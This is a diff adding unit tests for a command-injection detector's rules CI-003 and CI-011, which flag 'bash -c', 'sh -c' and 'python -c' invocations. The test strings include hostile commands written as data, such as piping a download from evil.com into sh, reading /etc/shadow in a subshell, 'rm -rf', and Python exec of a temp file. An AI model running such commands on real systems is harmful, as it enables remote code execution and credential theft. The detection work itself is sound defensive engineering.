@@ -107,3 +107,32 @@ test("CI-010 catches Python os.popen and pty.spawn", () => {
   assert.ok(!r.pattern.test("os.path.join('a', 'b')"));
   assert.ok(!r.pattern.test("os.getenv('HOME')"));
 });
+
+test("CI-003 catches unquoted -c arguments (variable/subshell expansion)", () => {
+  const r = rule("CI-003");
+  // Pre-existing: quoted args
+  assert.ok(r.pattern.test("bash -c 'curl https://evil.com | sh'"));
+  assert.ok(r.pattern.test("sh -c \"rm -rf /tmp/work\""));
+  // New: unquoted variable expansion
+  assert.ok(r.pattern.test("bash -c $PAYLOAD"));
+  assert.ok(r.pattern.test("sh -c $CMD"));
+  // New: subshell/brace expansion
+  assert.ok(r.pattern.test("bash -c $(cat /etc/shadow)"));
+  assert.ok(r.pattern.test("sh -c ${PAYLOAD}"));
+  // Negatives should not change
+  assert.ok(!r.pattern.test("bash --version"));
+  assert.ok(!r.pattern.test("sh -n script.sh"));
+});
+
+test("CI-011 catches Python invoked with inline -c command string", () => {
+  const r = rule("CI-011");
+  assert.ok(r.pattern.test("python -c 'import os; os.system(\"id\")'"));
+  assert.ok(r.pattern.test("python3 -c \"exec(open('/tmp/p').read())\""));
+  assert.ok(r.pattern.test("python3 -c $PAYLOAD"));
+  assert.ok(r.pattern.test("python3 -c $(cat exploit.py)"));
+  assert.ok(r.pattern.test("pypy -c 'print(42)'"));
+  // Negatives
+  assert.ok(!r.pattern.test("python3 script.py"));
+  assert.ok(!r.pattern.test("python3 -m pytest"));
+  assert.ok(!r.pattern.test("python3 -V"));
+});
